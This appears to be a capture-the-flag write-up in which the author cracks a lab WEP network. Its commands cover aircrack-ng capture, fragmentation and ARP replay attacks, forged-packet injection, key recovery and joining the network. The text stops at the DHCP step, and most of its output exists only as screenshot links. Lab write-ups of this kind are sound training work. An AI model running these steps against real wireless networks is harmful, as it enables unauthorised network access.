### What is the ESSID of the target?

```sh
airodump-ng wlan0mon -c 1 -w WEP
```

![](Screenshot%202026-09-22%20at%2013.37.10.png)
### What is the WEP KEY for this network? (Format: XX:XX:XX:XX:XX)

![](Screenshot%202026-09-22%20at%2013.38.08.png)

We would try Fragmentation Attack technique

```sh
aireplay-ng -5 -b B2:A6:3D:EB:23:A3 -h 32:EB:A0:E2:7B:CB wlan0mon
```

![](Screenshot%202026-09-22%20at%2014.02.55.png)
![](Screenshot%202026-09-22%20at%2014.05.42.png)

```sh
tcpdump -s 0 -n -e -r replay_src-0922-070229.cap
```

![](Screenshot%202026-09-22%20at%2014.03.41.png)

```sh
packetforge-ng -0 -a B2:A6:3D:EB:23:A3 -h 32:EB:A0:E2:7B:CB -k 255.255.255.255 -l 255.255.255.255 -y fragment-0805-191851.xor -w forgedarp.cap
```

![](Screenshot%202026-09-22%20at%2014.06.28.png)

```sh
aireplay-ng -2 -r forgedarp.cap -h 32:EB:A0:E2:7B:CB wlan0mon
```

![](Screenshot%202026-09-22%20at%2014.09.15.png)

```sh
sudo aireplay-ng -3 -b B2:A6:3D:EB:23:A3 -h 32:EB:A0:E2:7B:CB wlan0mon
```

![](Screenshot%202026-09-22%20at%2014.09.44.png)

```sh
aircrack-ng -b B2:A6:3D:EB:23:A3 WEP-01.cap
```

![](Screenshot%202026-09-22%20at%2014.08.53.png)
### Connect to the WiFi network using the found key and retrieve the flag from 192.168.1.1.

Create a config file

![](Screenshot%202026-09-22%20at%2014.20.08.png)

```sh
wpa_supplicant -c wifi.conf -i wlan0
```

![](Screenshot%202026-09-22%20at%2014.21.55.png)

In different terminal, we gonna use dhclient for obtaining IP from DHCP

```sh
dhclient wlan0
```

![](Screenshot%202026-09-22%20at%2014.22.53.png)